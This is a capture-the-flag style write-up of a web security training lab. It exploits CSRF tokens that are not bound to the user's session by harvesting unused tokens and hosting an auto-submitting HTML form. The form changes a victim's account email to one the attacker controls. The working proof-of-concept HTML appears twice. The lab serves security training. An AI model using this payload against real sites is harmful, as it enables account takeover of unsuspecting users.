# Lab: CSRF where token is not tied to user session

 This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

    wiener:peter
    carlos:montoya

# Step 1 Walk the application's change email function using burp

I login as wiener and change the email to get the requests in my burp http history

![image](https://user-images.githubusercontent.com/83407557/210835651-fb802932-0740-400b-ae36-e30eba72c8f8.png)

![image](https://user-images.githubusercontent.com/83407557/210835775-ff7370eb-ad8e-4027-b237-d36db5b0c001.png)

# Step 2 Create a POC

I send this request to engagement tools-->CSRF POC generator:

![image](https://user-images.githubusercontent.com/83407557/210836029-14ea5ffc-e450-4869-8a8a-16f566edf15e.png)

I add a auto-submit script under options and regenerate

![image](https://user-images.githubusercontent.com/83407557/210836274-64b0b02f-a883-4b29-8616-b788e3bef4ae.png)

**POC**

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0ad3008c04b994d1c0504a9700db00aa.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="hidden" name="csrf" value="nyXXJftiIoUZuaTaCPpo9km931lEH6KW" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# Step 3 see if CSRF token is tied to session

Since I have another user I can test, I want to first grab a CSRF token for my current user, so I interpect another request to change my email as wiener, but drop the request:

![image](https://user-images.githubusercontent.com/83407557/210836866-5116c8d3-4862-4a70-97c5-500796006b44.png)

Taking note of the token before dropping:

```
H41NLiHmZ5Wrj070Zh83Rzd4hXkxW0Ws
```
I then open a new private window, I login to carlos:

![image](https://user-images.githubusercontent.com/83407557/210837504-4e4be6f8-a2ad-42a1-bb95-bbf799519ffc.png)

I update carlos' email but capture the request:

![image](https://user-images.githubusercontent.com/83407557/210837702-a38aa0f5-fac0-4b53-8542-c974a002428d.png)

I then replace the csrf token with the one I captured from wiener

![image](https://user-images.githubusercontent.com/83407557/210837905-9bcdd592-f0a0-45a0-a56d-c01405e52004.png)

I see that the email for carlos is changed, telling me that the CSRF token is not tied to a session, but intead is part of a pool that all sessions have access to:

![image](https://user-images.githubusercontent.com/83407557/210838237-b7183c9c-e211-4633-88fd-e9c932d0df6d.png)

# Step 4 collect a few CSRF tokens for testing

I collect a few CSRF tokens as I did before, making sure to drop the requests to the tokens are created by the server, but not used:

**Tokens**
```
hbwE3K9t6hoTtte61eACovjBdV63yVJl

tfVwJG7jXVGS06ppwPX90tGpFWrUCL0u

zvAaomCiYQjNG373dji1tIR5v3vo18UA
```

# Step 5 update the POC

Each time I use the POC a token will get used up, so I will need to update the token each time I test it.

First I change the email to hermh4cks@gmail.com and regenerate the POC:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://0ad3008c04b994d1c0504a9700db00aa.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hermh4cks&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="nyXXJftiIoUZuaTaCPpo9km931lEH6KW" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

# Step 5 Host POC on attack-server

I add the POC to the body of /exploit on my attack server and change the value of csrf to the first one in my own pool of captured tokens:

![image](https://user-images.githubusercontent.com/83407557/210839882-f24a6081-41a0-441c-8d43-dfe1dba0a16f.png)

After saving and viewing exploit, I see that carlos has had their email changed to hermh4cks@gmail.com:

![image](https://user-images.githubusercontent.com/83407557/210840054-3069b668-bad6-43a0-89f9-2840fc176fde.png)

# Step 6 update POC

I change the value of the csrf token again in the POC:

![image](https://user-images.githubusercontent.com/83407557/210840377-5adcae82-22e4-4466-9d10-43fcbec4f303.png)

# Step 7 Send exploit to victim

With a fresh CSRF token that isn't tied to a session in place, I send the exploit to the victim

![image](https://user-images.githubusercontent.com/83407557/210840648-0668569d-9ded-4a75-aafb-1587ba2ef413.png)

The attack successfully changes the victim's email to one I control, and solves the lab:

![image](https://user-images.githubusercontent.com/83407557/210840839-8da0f2ae-0f7f-47fb-bfdc-3236bb45c79e.png)
